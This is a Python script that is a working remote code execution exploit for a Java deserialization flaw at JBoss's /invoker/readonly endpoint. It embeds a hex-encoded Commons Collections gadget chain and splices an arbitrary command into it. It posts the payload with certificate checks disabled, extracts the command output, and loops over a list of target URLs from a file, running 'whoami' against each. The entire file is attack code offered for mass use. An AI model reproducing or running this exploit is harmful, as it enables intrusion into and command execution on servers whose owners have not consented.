import binascii
import re
import requests

requests.packages.urllib3.disable_warnings()

raw = b'aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b7870737200316f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e5472616e73666f726d65644d617061773fe05df15a700300024c000e6b65795472616e73666f726d657274002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b4c001076616c75655472616e73666f726d657271007e00057870707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f727571007e0018000000017671007e00187371007e00117571007e0016000000017571007e0016000000017571007e001a000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f7269747971007e00134c000466696c6571007e00134c0004686f737471007e00134c000870726f746f636f6c71007e00134c000372656671007e00137870ffffffffffffffff707400132e2e2f2e726561646d652e68746d6c2e746d7074000074000466696c65707874000b6e6577496e7374616e63657571007e0018000000017671007e00167371007e00117571007e001600000001740016636f6d2e7061796c6f61642e52756e436f6d6d616e647400096c6f6164436c6173737571007e001800000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00117571007e0016000000017571007e00180000000171007e003171007e001c7571007e00180000000171007e001e7371007e00117571007e001600000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000677686f616d6971007e00287571007e00180000000171007e002a737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000174000576616c756571007e003e78787672001e6a6176612e6c616e672e616e6e6f746174696f6e2e526574656e74696f6e00000000000000000000007870'


def exp(url, cmd):
    payload = binascii.unhexlify(raw.replace(b'00677686f616d69', str.encode((3 - len(hex(len(cmd))[2:])) * '0' + hex(len(cmd))[2:]) + binascii.hexlify(str.encode(cmd))))
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)'
    }
    try:
        r = requests.post(url + '/invoker/readonly', data=payload, headers=headers, verify=False, timeout=10)
        # print(r.text)
        res = re.findall('==========(.*?)\n==========', r.text, re.DOTALL)
        if res:
            print(url, res[0])
            # open('success.txt', 'a').write(url+'\n')
        else:
            print(url, '无漏洞')
    except Exception:
        print(url, '请求失败')


if __name__ == '__main__':
    urls = open('urls.txt').readlines()
    for url in urls:
        url = url.strip()
        exp(url, 'whoami')
